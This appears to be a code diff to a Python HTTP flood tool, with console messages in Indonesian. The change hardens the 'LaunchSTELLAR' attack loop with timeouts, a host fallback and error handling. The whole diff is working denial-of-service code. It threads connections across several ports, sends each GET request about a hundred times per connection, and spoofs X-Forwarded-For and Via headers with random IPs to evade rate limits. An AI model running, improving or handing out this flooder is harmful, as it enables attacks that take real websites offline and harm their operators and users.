@@ -122,55 +122,67 @@ def attackSTELLAR(url, timer, threads):
         threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
 
 def LaunchSTELLAR(url, timer):
-    end_time = time.time() + timer
-    user_agents = load_user_agents()
-    paths = ["/", "/index.html", "/home", "/news", "/contact", f"/rand{random.randint(100,999)}"]
+    try:
+        end_time = time.time() + timer
+        user_agents = load_user_agents()
+        paths = ["/", "/index.html", "/home", "/news", "/contact", f"/rand{random.randint(100,999)}"]
 
-    while time.time() < end_time:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            host = urlparse(url).netloc
-            port_list = [443, 80, 8080, 8000, 8888]
-            connected = False
+        while time.time() < end_time:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(3)
 
-            for port in port_list:
-                try:
-                    s.connect((host, port))
-                    if port == 443:
-                        ctx = ssl.create_default_context()
-                        s = ctx.wrap_socket(s, server_hostname=host)
-                    connected = True
-                    console.print(f"{H2}[+] Terhubung ke {host}:{port}", style="green")
-                    break
-                except:
+                host = urlparse(url).netloc
+                if not host:
+                    host = url  # fallback jika user input bukan URL utuh
+
+                port_list = [443, 80, 8080, 8000, 8888]
+                connected = False
+
+                for port in port_list:
+                    try:
+                        s.connect((host, port))
+                        if port == 443:
+                            ctx = ssl.create_default_context()
+                            s = ctx.wrap_socket(s, server_hostname=host)
+                        connected = True
+                        console.print(f"{H2}[+] Terhubung ke {host}:{port}", style="green")
+                        break
+                    except:
+                        continue
+
+                if not connected:
+                    console.print(f"{M2}[-] Gagal konek ke {host}", style="red")
+                    s.close()
+                    time.sleep(0.5)
                     continue
 
-            if not connected:
-                console.print(f"{M2}[-] Gagal konek ke {host}", style="red")
+                xff_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+                path = random.choice(paths)
+                req = (
+                    f"GET {path} HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"User-Agent: {random.choice(user_agents)}\r\n"
+                    f"X-Forwarded-For: {xff_ip}\r\n"
+                    f"Via: 1.1 {xff_ip}\r\n"
+                    f"Accept: */*\r\n"
+                    f"Connection: Keep-Alive\r\n\r\n"
+                )
+                try:
+                    s.send(req.encode())
+                    for _ in range(100):
+                        s.send(req.encode())
+                except:
+                    pass
                 s.close()
-                time.sleep(1)
-                continue
+                time.sleep(0.1)
 
-            xff_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-            path = random.choice(paths)
-            req = (
-                f"GET {path} HTTP/1.1\r\n"
-                f"Host: {host}\r\n"
-                f"User-Agent: {random.choice(user_agents)}\r\n"
-                f"X-Forwarded-For: {xff_ip}\r\n"
-                f"Via: 1.1 {xff_ip}\r\n"
-                f"Accept: */*\r\n"
-                f"Connection: Keep-Alive\r\n\r\n"
-            )
-            s.send(req.encode())
-            for _ in range(100):
-                s.send(req.encode())
-            time.sleep(0.1)
-            s.close()
-        except Exception as e:
-            console.print(Panel(f"{M2}Kesalahan koneksi: {e}", style="bold red"))
-            time.sleep(1)
+            except Exception as e:
+                console.print(Panel(f"{M2}Kesalahan koneksi: {e}", style="bold red"))
+                time.sleep(1)
+    except Exception as fatal_error:
+        console.print(Panel(f"{M2}Thread mati karena error fatal: {fatal_error}", style="bold red"))
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=t)
